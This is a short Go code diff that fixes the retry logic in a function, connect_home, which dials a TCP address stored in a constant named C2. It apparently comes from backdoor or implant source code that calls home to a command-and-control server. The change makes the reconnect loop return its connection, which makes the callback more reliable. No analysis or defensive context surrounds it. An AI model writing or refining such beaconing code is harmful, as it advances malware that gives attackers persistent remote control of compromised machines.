@@ -157,7 +157,7 @@ func connect_home() (net.Conn, error) {
 	conn, err := net.Dial("tcp", C2)
 	if err != nil {
 		time.Sleep(15e9)
-		connect_home()
+		return connect_home()
 	}
 	return conn, err
 }
